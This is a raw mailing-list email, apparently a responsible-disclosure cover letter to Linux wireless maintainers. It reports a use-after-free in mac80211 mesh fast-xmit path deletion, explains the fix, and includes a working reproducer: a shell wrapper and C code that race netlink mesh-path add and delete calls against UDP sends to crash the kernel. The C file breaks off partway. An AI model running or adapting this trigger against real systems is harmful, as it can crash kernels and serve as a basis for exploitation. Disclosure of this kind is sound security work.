Received: from mail-pj2-f43.google.com (mail-pj2-f43.google.com [74.125.227.171])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 9225F372B5A
	for <linux-wireless@vger.kernel.org>; Fri, 18 Sep 2026 05:27:01 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.227.171
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1789709224; cv=none; b=fVrT/X36+FZXcgHczeRqLDkaHGAibDJTBPxfz05bkNlfo3pjFtAhMA5tjxBJM4JVFxlv89O5ehoSOMt5czAUzeiGSklCWFW3rwOiuCiCzX7F+1qNnptbX+H8w0UkXvnbSLvIANqpFBH/YKpmR9aGxErzpAFE4NTrjmCLhHHonyE=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1789709224; c=relaxed/simple;
	bh=TCOq1swggA97Jum1X1LUF0wMMm9TIIff57Ge6ltEM4s=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=Fm+fVQoUvS7omrIr6cMWEmmQTPpIx6onBHZjSoRZdBfEcvfKZE0tp+6N+ib4M4WMYZCQNMqmgjuKsJUZuM2M2pAQQkPY5KXqQt5/pce9+KV+zKqg5d1ZqF9TudLx3wLNidC+SFf9X7Atzsaunx5LLQUmPT4vHZ2aObHYv0+1+Bk=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=hOx1M9gp; arc=none smtp.client-ip=74.125.227.171
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="hOx1M9gp"
Received: by mail-pj2-f43.google.com with SMTP id d9443c01a7336-2d747ed6d6eso3169855ad.2
        for <linux-wireless@vger.kernel.org>; Thu, 17 Sep 2026 22:27:01 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1789709221; x=1790314021; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=4OX6SdqV1er2x0sZpuUytwTC4E1DFs2cG2ixtzre0L4=;
        b=hOx1M9gpSczOSWaZx9OmAxAVlkpQ76pXwktyf1QRgiLunJPDaCsiAIoGPpPgjbQSMc
         4Z/r7kInSQyiIsTCzXZGJh2qzir+POaeDoBzSIen4lrEloscIh3t2lTh4zSygeis/OTm
         4nLlz+pRpsT1GM24ldrSqEdAtkP5FJx20rRddRVwK+zIvKPHoS1QGWB1RJzOMfEli43T
         dvIjUgLZgow7IueLcQabparlDzkN/Ds5DXnbzdsV6Wk4KC4b4MntXs7/CvRsSyXU28Sm
         30uoveVTB64/vUU6iMqqQcI/kzh80aTDwztQl1uYxd8ZwpPTa+sW4rM/6Rcl2c+l0MWr
         dy8Q==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1789709221; x=1790314021;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=4OX6SdqV1er2x0sZpuUytwTC4E1DFs2cG2ixtzre0L4=;
        b=sx41EvU/1BmR/ZCI08Bgfw077MbMmdli59rmRqGzZ0FS3sNI+w1VJWSgg8otxPRXt9
         Qmt92qna0uqg26QvbMIiZC0R+jIEksIfrekRmytpR3OIh5sBmouDj/S6nq8AfeSuq7GJ
         YrMnmggF/nZ8K/QoYw6+xiwyYzH1JRm63W55rFtZ1FQljMKTg59B7qXaOpVzr75S1YzL
         sTWvuSC+1/JkEURPY1lv1TqHm4qr621UdijcRb6Irqdc5v1KAgKrkx26Vy7P/xrNsNqD
         P0GPIQgQzGxPAW40nxYRDDUDICxKpUJ3tJHzfGyqDIvbQCEK4Nq8IZVBlnNjwG9UFngH
         XgDw==
X-Forwarded-Encrypted: i=1; AKwUvBwE80ydaTm5pJ34/1EP20ouYhedAJ38n3DnHuPiexqDgMSqS8yx/zuJtuhy+98zsohHtdcqGzjop0QgrmITTQ==@vger.kernel.org
X-Gm-Message-State: AFuF++mfYVQ4duPFauJF5LrUyRN/EpD4vltvHKO2k5lUpcNuL9hSlXkH
	5MWGv8qGuJno1w+SwhtCSXRVMxFkqdyJFv1Vz8lSuvo1JokwIzpYLaZIZMSJlqrk8ck62+wFGWU
	Dw28aFgkn
X-Gm-Gg: AYBFou0tGW1G1bPSiat4kJUoz+GmPQbbuTjigPnXHhkgKtSEElUnep1lVYuQ4k0vZ60
	xMrIBfHwGMWzfRWk1k3/7b5atP0c4BO7T9gOHpD4+uAWGJjJTLUOAlmEgchUeVfKto8AXvoWXOX
	bCSle8B4MiyVGpRfi6WTScBJkuypwuleUn12uY8jO3abTCNPPGuoY4WDwUeqSgSMyikh3TJGT8z
	y6V4WUks6dl3ezK1mHObj4kTQLvY5ZISsX2BvrlpQigJKjz6CLGpYFkTeKNuzfm0wCIqgP8i7Wv
	X1gm5pSTUgEijL1H9k3lI58Z8AeRxNjvrZWJWCg/uLDlAsWsD2i8ARmjAOXErR4eJSKfnrJ3pO0
	1cRgddNl7lpNQw5Yqt34wv4uB6fQTHWZoDXeQcCMLZaYNZZf6Lrr6OyzubR7E/oB8HniTx67MTQ
	G2rSLE37UBMbvO2iWglr5LcwxFG+wIYVE8Okmiy4F3PsTwti4R4OPCTx6JddmZ/JbRuYEG8hl5a
	dHhmwQgKWPCg7VgIqynCoSMDhEHJA==
X-Received: by 2002:a17:902:e80f:b0:2dd:adee:c44 with SMTP id d9443c01a7336-2ddb1adb401mr30800975ad.12.1789709220293;
        Thu, 17 Sep 2026 22:27:00 -0700 (PDT)
Received: from b6ad5085b32f.. ([122.51.212.64])
        by smtp.gmail.com with ESMTPSA id d9443c01a7336-2ddb75f2d3asm2122795ad.72.2026.09.17.22.26.56
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Thu, 17 Sep 2026 22:26:59 -0700 (PDT)
From: Zihan Xi <zihanx@nebusec.ai>
To: Johannes Berg <johannes@sipsolutions.net>
Cc: Zihan Xi <zihanx@nebusec.ai>,
	linux-wireless@vger.kernel.org,
	linux-kernel@vger.kernel.org,
	Ryder Lee <ryder.lee@mediatek.com>,
	Felix Fietkau <nbd@nbd.name>
Subject: [PATCH wireless v3 0/1] wifi: mac80211: fix mesh fast xmit path deletion UAF
Date: Fri, 18 Sep 2026 05:26:50 +0000
Message-ID: <cover.1789615568.git.zihanx@nebusec.ai>
X-Mailer: git-send-email 2.47.3
Precedence: bulk
X-Mailing-List: linux-wireless@vger.kernel.org
List-Id: <linux-wireless.vger.kernel.org>
List-Subscribe: <mailto:linux-wireless+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-wireless+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: quoted-printable

Hi Linux kernel maintainers,=0D
=0D
We found and validated an issue in=0D
net/mac80211/mesh_pathtbl.c. The v3 validation below includes MODE=3Droot a=
nd=0D
MODE=3Dnamespace. Both modes were started by guest UID 0; poc.sh performs t=
he=0D
single unshare -Urn internally. These runs do not establish non-root=0D
reachability.=0D
We've tested it, and no other impact was observed in these tests.=0D
=0D
We will provide detailed information about the bug=0D
in this email, along with a PoC to trigger it.=0D
=0D
---- details below ----=0D
=0D
Bug details:=0D
=0D
mesh_fast_tx_cache() stores raw pointers to mesh paths. Path deletion=0D
flushes matching cache entries and then queues the path for RCU freeing=0D
with kfree_rcu(), but a lookup that already holds the path in an RCU=0D
read-side critical section can insert a new cache entry after the flush,=0D
leaving the cache entry pointing at freed memory.=0D
=0D
The KASAN report below follows the local-TX path:=0D
ieee80211_mesh_xmit_fast() -> mesh_fast_tx_get().=0D
The same cache is also consumed by=0D
ieee80211_rx_mesh_fast_forward(), but this report covers only the local-TX=
=0D
path.=0D
The v3 validation also ran MODE=3Dnamespace from guest UID 0. The two=0D
namespace-local radios reached mesh peer ESTAB in both trees. The unpatched=
=0D
run recorded signature=3D1 with poc_rc=3D255 after the KASAN panic; the pat=
ched=0D
run recorded signature=3D0 with poc_rc=3D137 after the harness timeout. The=
se=0D
are namespace smoke results, not clean process-exit results, and do not=0D
establish non-root reachability.=0D
The report was decoded with scripts/decode_stacktrace.sh using an=0D
unpatched vmlinux built with CONFIG_DEBUG_INFO=3Dy and=0D
CONFIG_DEBUG_INFO_DWARF4=3Dy. The kernel frames below include source=0D
locations.=0D
=0D
The cache was added in d5edb9ae8d56 ("wifi: mac80211: mesh fast=0D
xmit support"). A later addition of GENL_UNS_ADMIN_PERM to the mpath=0D
netlink commands made the namespace trigger easier to exercise; the=0D
namespace smoke run above was still started by guest UID 0.=0D
=0D
The fix sets MESH_PATH_DELETED before the flush and rejects cache=0D
insertion if the path or MPP path is already deleted. The check runs=0D
under the cache walk lock, ordering it with the flush.=0D
The deletion-side flag updates use WRITE_ONCE() to match the=0D
lockless READ_ONCE() checks while preserving the other path flags.=0D
=0D
The reproducer consists of Makefile, poc.sh, and poc.c. poc.c links=0D
against libnl-3 and libnl-genl-3. The v3 root-mode run used make followed=0D
by RUN_SECONDS=3D60 MODE=3Droot ./poc.sh. The namespace smoke run used=0D
RUN_SECONDS=3D60 MODE=3Dnamespace ./poc.sh. That command must not be=0D
wrapped in another unshare: poc.sh performs its single unshare -Urn=0D
internally. Both validation commands started as guest UID 0, so the=0D
namespace invocation is not a non-root test.=0D
In namespace mode, the wrapper creates two mac80211_hwsim radios; both=0D
modes join a mesh and race NL80211_CMD_NEW_MPATH /=0D
NL80211_CMD_DEL_MPATH with local UDP transmission. packetdrill is not used=
=0D
because it cannot express 802.11 mesh setup or nl80211 mpath control=0D
operations.=0D
=0D
Reproducer:=0D
=0D
No ethtool runtime file is required, used, or copied by this reproducer.=0D
Run the following from the directory containing the three attached files;=0D
the complete guest preparation and run commands were:=0D
=0D
    apt-get -o Acquire::Check-Valid-Until=3Dfalse update=0D
    apt-get -o Acquire::Check-Valid-Until=3Dfalse install -y \=0D
        --no-install-recommends gcc make pkg-config libnl-3-dev \=0D
        libnl-genl-3-dev iw iproute2 ca-certificates=0D
    mkdir -p /root/mesh-poc=0D
    cp ./poc.c ./poc.sh ./Makefile /root/mesh-poc/=0D
    cd /root/mesh-poc=0D
    chmod +x poc.sh=0D
    make=0D
    RUN_SECONDS=3D60 MODE=3Droot ./poc.sh=0D
    RUN_SECONDS=3D60 MODE=3Dnamespace ./poc.sh=0D
=0D
We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.=0D
=0D
------BEGIN poc.sh------=0D
#!/bin/sh=0D
set -eu=0D
=0D
SCRIPT_DIR=3D$(CDPATH=3D cd -- "$(dirname -- "$0")" && pwd)=0D
cd "$SCRIPT_DIR"=0D
PATH=3D/usr/sbin:/usr/bin:/sbin:/bin=0D
=0D
MODE=3D${MODE:-namespace}=0D
RUN_SECONDS=3D${RUN_SECONDS:-180}=0D
SENDERS=3D${SENDERS:-4}=0D
ADDERS=3D${ADDERS:-2}=0D
DELETERS=3D${DELETERS:-2}=0D
PAYLOAD_LEN=3D${PAYLOAD_LEN:-256}=0D
ADD_PAUSE_US=3D${ADD_PAUSE_US:-100}=0D
DEL_PAUSE_US=3D${DEL_PAUSE_US:-0}=0D
MESH_ID=3D${MESH_ID:-mtest}=0D
MESH_FREQ=3D${MESH_FREQ:-2412}=0D
=0D
cleanup_root() {=0D
	iw dev mesh0 del >/dev/null 2>&1 || true=0D
	iw dev mesh1 del >/dev/null 2>&1 || true=0D
}=0D
=0D
wait_for_peer() {=0D
	ifname=3D$1=0D
	deadline=3D$(( $(date +%s) + 30 ))=0D
	while [ "$(date +%s)" -lt "$deadline" ]; do=0D
		if iw dev "$ifname" station dump | grep -q 'mesh plink:.*ESTAB'; then=0D
			return 0=0D
		fi=0D
		sleep 1=0D
	done=0D
	return 1=0D
}=0D
=0D
make=0D
=0D
if [ "$MODE" =3D "root" ]; then=0D
	cleanup_root=0D
	trap cleanup_root EXIT INT TERM=0D
=0D
	iw phy phy0 interface add mesh0 type mp=0D
	iw phy phy1 interface add mesh1 type mp=0D
=0D
	ip link set mesh0 up=0D
	ip link set mesh1 up=0D
=0D
	iw dev mesh0 mesh join "$MESH_ID" freq "$MESH_FREQ"=0D
	iw dev mesh1 mesh join "$MESH_ID" freq "$MESH_FREQ"=0D
=0D
	wait_for_peer mesh0=0D
=0D
	M0=3D$(cat /sys/class/net/mesh0/address)=0D
	M1=3D$(cat /sys/class/net/mesh1/address)=0D
=0D
	ip addr flush dev mesh0 >/dev/null 2>&1 || true=0D
	ip addr flush dev mesh1 >/dev/null 2>&1 || true=0D
	ip addr add 10.0.0.1/24 dev mesh0=0D
	ip addr add 10.0.0.2/24 dev mesh1=0D
	ip neigh replace 10.0.0.2 lladdr "$M1" nud permanent dev mesh0=0D
	ip neigh replace 10.0.0.1 lladdr "$M0" nud permanent dev mesh1=0D
=0D
	iw dev mesh0 mpath new "$M1" next_hop "$M1" >/dev/null 2>&1 || true=0D
=0D
	echo 1 >/proc/sys/kernel/panic_on_warn=0D
=0D
	echo "[*] mesh0=3D$M0 mesh1=3D$M1"=0D
	echo "[*] mesh peers"=0D
	iw dev mesh0 station dump || true=0D
	echo "[*] initial mpath"=0D
	iw dev mesh0 mpath dump || true=0D
=0D
	exec ./poc -i mesh0 -a 10.0.0.2 -m "$M1" -n "$M1" -s "$RUN_SECONDS" \=0D
		-t "$SENDERS" -A "$ADDERS" -D "$DELETERS" -l "$PAYLOAD_LEN" \=0D
		-u "$ADD_PAUSE_US" -v "$DEL_PAUSE_US"=0D
fi=0D
=0D
if [ "$MODE" !=3D "namespace" ]; then=0D
	echo "Unsupported MODE=3D$MODE" >&2=0D
	exit 1=0D
fi=0D
=0D
if [ -z "${INSIDE_NAMESPACE:-}" ]; then=0D
	exec unshare -Urn env INSIDE_NAMESPACE=3D1 MODE=3Dnamespace \=0D
		RUN_SECONDS=3D"$RUN_SECONDS" SENDERS=3D"$SENDERS" ADDERS=3D"$ADDERS" \=0D
		DELETERS=3D"$DELETERS" PAYLOAD_LEN=3D"$PAYLOAD_LEN" \=0D
		ADD_PAUSE_US=3D"$ADD_PAUSE_US" DEL_PAUSE_US=3D"$DEL_PAUSE_US" \=0D
		MESH_ID=3D"$MESH_ID" MESH_FREQ=3D"$MESH_FREQ" PATH=3D"$PATH" \=0D
		sh ./poc.sh=0D
fi=0D
=0D
./poc -R 1 >/dev/null 2>&1 || true=0D
./poc -R 1 >/dev/null 2>&1 || true=0D
sleep 1=0D
=0D
IFS0=3D$(iw dev | awk '/Interface/ {print $2}' | sed -n '1p')=0D
IFS1=3D$(iw dev | awk '/Interface/ {print $2}' | sed -n '2p')=0D
=0D
if [ -z "$IFS0" ] || [ -z "$IFS1" ]; then=0D
	echo "Failed to provision two namespace-local hwsim radios" >&2=0D
	exit 1=0D
fi=0D
=0D
iw dev "$IFS0" set type mp=0D
iw dev "$IFS1" set type mp=0D
ip link set "$IFS0" up=0D
ip link set "$IFS1" up=0D
iw dev "$IFS0" mesh join "$MESH_ID" freq "$MESH_FREQ"=0D
iw dev "$IFS1" mesh join "$MESH_ID" freq "$MESH_FREQ"=0D
=0D
wait_for_peer "$IFS0"=0D
=0D
PEER=3D$(iw dev "$IFS0" station dump | awk '/^Station/ {print $2; exit}')=0D
if [ -z "$PEER" ]; then=0D
	echo "Failed to learn peer station MAC" >&2=0D
	exit 1=0D
fi=0D
=0D
ip addr flush dev "$IFS0" >/dev/null 2>&1 || true=0D
ip addr add 10.0.0.1/24 dev "$IFS0"=0D
ip neigh replace 10.0.0.2 lladdr "$PEER" nud permanent dev "$IFS0"=0D
iw dev "$IFS0" mpath new "$PEER" next_hop "$PEER" >/dev/null 2>&1 || true=0D
=0D
echo "[*] namespace if0=3D$IFS0 if1=3D$IFS1 peer=3D$PEER"=0D
echo "[*] mesh peers"=0D
iw dev "$IFS0" station dump || true=0D
echo "[*] initial mpath"=0D
iw dev "$IFS0" mpath dump || true=0D
=0D
exec ./poc -i "$IFS0" -a 10.0.0.2 -m "$PEER" -n "$PEER" -s "$RUN_SECONDS" \=
=0D
	-t "$SENDERS" -A "$ADDERS" -D "$DELETERS" -l "$PAYLOAD_LEN" \=0D
	-u "$ADD_PAUSE_US" -v "$DEL_PAUSE_US"=0D
------END poc.sh--------=0D
=0D
------BEGIN Makefile------=0D
CC ?=3D gcc=0D
PKG_CONFIG ?=3D pkg-config=0D
=0D
NL_CFLAGS !=3D $(PKG_CONFIG) --cflags libnl-3.0 libnl-genl-3.0=0D
NL_LIBS !=3D $(PKG_CONFIG) --libs libnl-3.0 libnl-genl-3.0=0D
=0D
CFLAGS +=3D -O2 -g -Wall -Wextra -pthread $(NL_CFLAGS)=0D
LDLIBS +=3D -pthread $(NL_LIBS)=0D
=0D
all: poc=0D
=0D
poc: poc.c=0D
=0D
clean:=0D
	rm -f poc=0D
------END Makefile--------=0D
=0D
------BEGIN poc.c------=0D
#define _GNU_SOURCE=0D
=0D
#include <arpa/inet.h>=0D
#include <errno.h>=0D
#include <linux/nl80211.h>=0D
#include <net/if.h>=0D
#include <netinet/in.h>=0D
#include <netlink/genl/ctrl.h>=0D
#include <netlink/genl/genl.h>=0D
#include <netlink/msg.h>=0D
#include <netlink/netlink.h>=0D
#include <pthread.h>=0D
#include <sched.h>=0D
#include <signal.h>=0D
#include <stdatomic.h>=0D
#include <stdbool.h>=0D
#include <stdint.h>=0D
#include <stdio.h>=0D
#include <stdlib.h>=0D
#include <string.h>=0D
#include <sys/socket.h>=0D
#include <sys/types.h>=0D
#include <time.h>=0D
#include <unistd.h>=0D
=0D
#define ETH_ALEN 6=0D
=0D
enum hwsim_commands {=0D
	HWSIM_CMD_UNSPEC,=0D
	HWSIM_CMD_REGISTER,=0D
	HWSIM_CMD_FRAME,=0D
	HWSIM_CMD_TX_INFO_FRAME,=0D
	HWSIM_CMD_NEW_RADIO,=0D
};=0D
=0D
enum hwsim_attrs {=0D
	HWSIM_ATTR_UNSPEC,=0D
	HWSIM_ATTR_ADDR_RECEIVER,=0D
	HWSIM_ATTR_ADDR_TRANSMITTER,=0D
	HWSIM_ATTR_FRAME,=0D
	HWSIM_ATTR_FLAGS,=0D
	HWSIM_ATTR_RX_RATE,=0D
	HWSIM_ATTR_SIGNAL,=0D
	HWSIM_ATTR_TX_INFO,=0D
	HWSIM_ATTR_COOKIE,=0D
	HWSIM_ATTR_CHANNELS,=0D
};=0D
=0D
struct cfg {=0D
	char ifname[IFNAMSIZ];=0D
	char dst_ip[INET_ADDRSTRLEN];=0D
	unsigned char dst_mac[ETH_ALEN];=0D
	unsigned char next_hop[ETH_ALEN];=0D
	unsigned int seconds;=0D
	unsigned int senders;=0D
	unsigned int adders;=0D
	unsigned int deleters;=0D
	unsigned int payload_len;=0D
	unsigned int add_pause_us;=0D
	unsigned int del_pause_us;=0D
	unsigned int hwsim_radios;=0D
};=0D
=0D
static struct cfg g_cfg =3D {=0D
	.ifname =3D "mesh0",=0D
	.dst_ip =3D "10.0.0.2",=0D
	.seconds =3D 180,=0D
	.senders =3D 4,=0D
	.adders =3D 1,=0D
	.deleters =3D 1,=0D
	.payload_len =3D 256,=0D
	.add_pause_us =3D 100,=0D
	.del_pause_us =3D 0,=0D
};=0D
=0D
static atomic_bool stop_flag;=0D
static atomic_ullong send_ok;=0D
static atomic_ullong send_err;=0D
static atomic_ullong add_ok;=0D
static atomic_ullong add_exist;=0D
static atomic_ullong add_err;=0D
static atomic_ullong del_ok;=0D
static atomic_ullong del_absent;=0D
static atomic_ullong del_err;=0D
=0D
static void usage(const char *prog)=0D
{=0D
	fprintf(stderr,=0D
		"Usage: %s [-i ifname] [-a ip] [-m dst_mac] [-n next_hop] "=0D
		"[-s seconds] [-t senders] [-A adders] [-D deleters] "=0D
		"[-l payload_len] [-u add_pause_us] [-v del_pause_us] "=0D
		"[-R create_radios]\n",=0D
		prog);=0D
}=0D
=0D
static int parse_mac(const char *text, unsigned char mac[ETH_ALEN])=0D
{=0D
	unsigned int bytes[ETH_ALEN];=0D
	size_t i;=0D
=0D
	if (sscanf(text, "%02x:%02x:%02x:%02x:%02x:%02x",=0D
		   &bytes[0], &bytes[1], &bytes[2],=0D
		   &bytes[3], &bytes[4], &bytes[5]) !=3D ETH_ALEN)=0D
		return -1;=0D
=0D
	for (i =3D 0; i < ETH_ALEN; i++)=0D
		mac[i] =3D bytes[i];=0D
=0D
	return 0;=0D
}=0D
=0D
static const char *mac_to_str(const unsigned char mac[ETH_ALEN], char *buf,=
=0D
			      size_t len)=0D
{=0D
	snprintf(buf, len, "%02x:%02x:%02x:%02x:%02x:%02x",=0D
		 mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);=0D
	return buf;=0D
}=0D
=0D
static void pin_to_cpu(unsigned int index)=0D
{=0D
	long ncpus =3D sysconf(_SC_NPROCESSORS_ONLN);=0D
	cpu_set_t cpus;=0D
=0D
	if (ncpus <=3D 0)=0D
		return;=0D
=0D
	CPU_ZERO(&cpus);=0D
	CPU_SET(index % (unsigned int)ncpus, &cpus);=0D
	(void)pthread_setaffinity_np(pthread_self(), sizeof(cpus), &cpus);=0D
}=0D
=0D
static void sleep_us(unsigned int usec)=0D
{=0D
	struct timespec ts;=0D
=0D
	if (!usec)=0D
		return;=0D
=0D
	ts.tv_sec =3D usec / 1000000U;=0D
	ts.tv_nsec =3D (long)(usec % 1000000U) * 1000L;=0D
	while (nanosleep(&ts, &ts) && errno =3D=3D EINTR)=0D
		;=0D
}=0D
=0D
static void stop_now(int signo)=0D
{=0D
	(void)signo;=0D
	atomic_store_explicit(&stop_flag, true, memory_order_relaxed);=0D
}=0D
=0D
static int nl80211_family(struct nl_sock *sock)=0D
{=0D
	if (genl_connect(sock) < 0)=0D
		return -1;=0D
=0D
	return genl_ctrl_resolve(sock, "nl80211");=0D
}=0D
=0D
static int hwsim_new_radio_once(struct nl_sock *sock, int family_id,=0D
				unsigned int channels)=0D
{=0D
	struct nl_msg *msg;=0D
	int err;=0D
=0D
	msg =3D nlmsg_alloc();=0D
	if (!msg)=0D
		return -NLE_NOMEM;=0D
=0D
	if (!genlmsg_put(msg, 0, 0, family_id, 0, 0, HWSIM_CMD_NEW_RADIO, 1)) {=0D
		nlmsg_free(msg);=0D
		return -NLE_MSGSIZE;=0D
	}=0D
=0D
	err =3D nla_put_u32(msg, HWSIM_ATTR_CHANNELS, channels);=0D
	if (err < 0) {=0D
		nlmsg_free(msg);=0D
		return err;=0D
	}=0D
=0D
	err =3D nl_send_auto(sock, msg);=0D
	if (err >=3D 0)=0D
		err =3D nl_wait_for_ack(sock);=0D
=0D
	nlmsg_free(msg);=0D
	return err;=0D
}=0D
=0D
static int create_hwsim_radios(unsigned int count)=0D
{=0D
	struct nl_sock *sock;=0D
	int family_id;=0D
	unsigned int i;=0D
=0D
	sock =3D nl_socket_alloc();=0D
	if (!sock) {=0D
		fprintf(stderr, "nl_socket_alloc(hwsim) failed\n");=0D
		return EXIT_FAILURE;=0D
	}=0D
=0D
	if (genl_connect(sock) < 0) {=0D
		fprintf(stderr, "genl_connect(hwsim) failed\n");=0D
		nl_socket_free(sock);=0D
		return EXIT_FAILURE;=0D
	}=0D
=0D
	family_id =3D genl_ctrl_resolve(sock, "MAC80211_HWSIM");=0D
	if (family_id < 0) {=0D
		fprintf(stderr, "genl_ctrl_resolve(MAC80211_HWSIM) failed: %d\n",=0D
			family_id);=0D
		nl_socket_free(sock);=0D
		return EXIT_FAILURE;=0D
	}=0D
=0D
	for (i =3D 0; i < count; i++) {=0D
		int err =3D hwsim_new_radio_once(sock, family_id, 1);=0D
=0D
		if (err < 0) {=0D
			fprintf(stderr, "new_radio_once[%u] failed: %d (%s)\n",=0D
				i, err, nl_geterror(err));=0D
			nl_socket_free(sock);=0D
			return EXIT_FAILURE;=0D
		}=0D
	}=0D
=0D
	printf("created %u hwsim radio(s)\n", count);=0D
	nl_socket_free(sock);=0D
	return EXIT_SUCCESS;=0D
}=0D
=0D
static int add_mpath_once(struct nl_sock *sock, int family_id, int ifindex,=
=0D
			  const unsigned char dst[ETH_ALEN],=0D
			  const unsigned char next_hop[ETH_ALEN])=0D
{=0D
	struct nl_msg *msg;=0D
	int err;=0D
=0D
	msg =3D nlmsg_alloc();=0D
	if (!msg)=0D
		return -NLE_NOMEM;=0D
=0D
	if (!genlmsg_put(msg, 0, 0, family_id, 0, 0, NL80211_CMD_NEW_MPATH, 0)) {=
=0D
		nlmsg_free(msg);=0D
		return -NLE_MSGSIZE;=0D
	}=0D
=0D
	err =3D nla_put_u32(msg, NL80211_ATTR_IFINDEX, ifindex);=0D
	if (err < 0)=0D
		goto out;=0D
=0D
	err =3D nla_put(msg, NL80211_ATTR_MAC, ETH_ALEN, dst);=0D
	if (err < 0)=0D
		goto out;=0D
=0D
	err =3D nla_put(msg, NL80211_ATTR_MPATH_NEXT_HOP, ETH_ALEN, next_hop);=0D
	if (err < 0)=0D
		goto out;=0D
=0D
	err =3D nl_send_auto(sock, msg);=0D
	if (err < 0)=0D
		goto out;=0D
=0D
	err =3D nl_wait_for_ack(sock);=0D
=0D
out:=0D
	nlmsg_free(msg);=0D
	return err;=0D
}=0D
=0D
static int del_mpath_once(struct nl_sock *sock, int family_id, int ifindex,=
=0D
			  const unsigned char dst[ETH_ALEN])=0D
{=0D
	struct nl_msg *msg;=0D
	int err;=0D
=0D
	msg =3D nlmsg_alloc();=0D
	if (!msg)=0D
		return -NLE_NOMEM;=0D
=0D
	if (!genlmsg_put(msg, 0, 0, family_id, 0, 0, NL80211_CMD_DEL_MPATH, 0)) {=
=0D
		nlmsg_free(msg);=0D
		return -NLE_MSGSIZE;=0D
	}=0D
=0D
	err =3D nla_put_u32(msg, NL80211_ATTR_IFINDEX, ifindex);=0D
	if (err < 0)=0D
		goto out;=0D
=0D
	err =3D nla_put(msg, NL80211_ATTR_MAC, ETH_ALEN, dst);=0D
	if (err < 0)=0D
		goto out;=0D
=0D
	err =3D nl_send_auto(sock, msg);=0D
	if (err < 0)=0D
		goto out;=0D
=0D
	err =3D nl_wait_for_ack(sock);=0D
=0D
out:=0D
	nlmsg_free(msg);=0D
	return err;=0D
}=0D
=0D
static void *adder_thread(void *arg)=0D
{=0D
	unsigned int thread_index =3D (unsigned long)arg;=0D
	struct nl_sock *sock;=0D
	int family_id;=0D
	int ifindex;=0D
=0D
	pin_to_cpu(g_cfg.senders + thread_index);=0D
=0D
	ifindex =3D if_nametoindex(g_cfg.ifname);=0D
	if (!ifindex) {=0D
		perror("if_nametoindex");=0D
		atomic_fetch_add_explicit(&add_err, 1, memory_order_relaxed);=0D
		return NULL;=0D
	}=0D
=0D
	sock =3D nl_socket_alloc();=0D
	if (!sock) {=0D
		fprintf(stderr, "nl_socket_alloc(add) failed\n");=0D
		atomic_fetch_add_explicit(&add_err, 1, memory_order_relaxed);=0D
		return NULL;=0D
	}=0D
=0D
	family_id =3D nl80211_family(sock);=0D
	if (family_id < 0) {=0D
		fprintf(stderr, "nl80211 family resolve(add) failed: %d\n",=0D
			family_id);=0D
		nl_socket_free(sock);=0D
		atomic_fetch_add_explicit(&add_err, 1, memory_order_relaxed);=0D
		return NULL;=0D
	}=0D
=0D
	while (!atomic_load_explicit(&stop_flag, memory_order_relaxed)) {=0D
		int err =3D add_mpath_once(sock, family_id, ifindex,=0D
					 g_cfg.dst_mac, g_cfg.next_hop);=0D
=0D
		if (!err) {=0D
			atomic_fetch_add_explicit(&add_ok, 1, memory_order_relaxed);=0D
			sleep_us(g_cfg.add_pause_us);=0D
			continue;=0D
		}=0D
=0D
		if (err =3D=3D -NLE_EXIST) {=0D
			atomic_fetch_add_explicit(&add_exist, 1,=0D
						  memory_order_relaxed);=0D
			sleep_us(g_cfg.add_pause_us);=0D
			continue;=0D
		}=0D
=0D
		atomic_fetch_add_explicit(&add_err, 1, memory_order_relaxed);=0D
	}=0D
=0D
	nl_socket_free(sock);=0D
	return NULL;=0D
}=0D
=0D
static void *deleter_thread(void *arg)=0D
{=0D
	unsigned int thread_index =3D (unsigned long)arg;=0D
	struct nl_sock *sock;=0D
	int family_id;=0D
	int ifindex;=0D
=0D
	pin_to_cpu(g_cfg.senders + g_cfg.adders + thread_index);=0D
=0D
	ifindex =3D if_nametoindex(g_cfg.ifname);=0D
	if (!ifindex) {=0D
		perror("if_nametoindex");=0D
		atomic_fetch_add_explicit(&del_err, 1, memory_order_relaxed);=0D
		return NULL;=0D
	}=0D
=0D
	sock =3D nl_socket_alloc();=0D
	if (!sock) {=0D
		fprintf(stderr, "nl_socket_alloc(del) failed\n");=0D
		atomic_fetch_add_explicit(&del_err, 1, memory_order_relaxed);=0D
		return NULL;=0D
	}=0D
=0D
	family_id =3D nl80211_family(sock);=0D
	if (family_id < 0) {=0D
		fprintf(stderr, "nl80211 family resolve(del) failed: %d\n",=0D
			family_id);=0D
		nl_socket_free(sock);=0D
		atomic_fetch_add_explicit(&del_err, 1, memory_order_relaxed);=0D
		return NULL;=0D
	}=0D
=0D
	while (!atomic_load_explicit(&stop_flag, memory_order_relaxed)) {=0D
